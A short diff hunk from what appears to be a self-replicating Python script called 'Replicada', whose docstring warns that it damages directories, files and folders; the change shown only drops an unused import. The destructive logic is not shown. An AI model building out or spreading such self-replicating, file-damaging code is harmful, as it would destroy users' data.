@@ -7,7 +7,7 @@ PLEASE MIND THAT THIS WOULD FUCK UP YOUR DIRECTORIES, INCLUDING FILES AND FOLDER
 self-replicating python file - Replicada by archisha69
 '''
 
-import os, shutil, time, random, string, sys
+import os, shutil, random, string, sys
 
 cwd = os.getcwd()
 
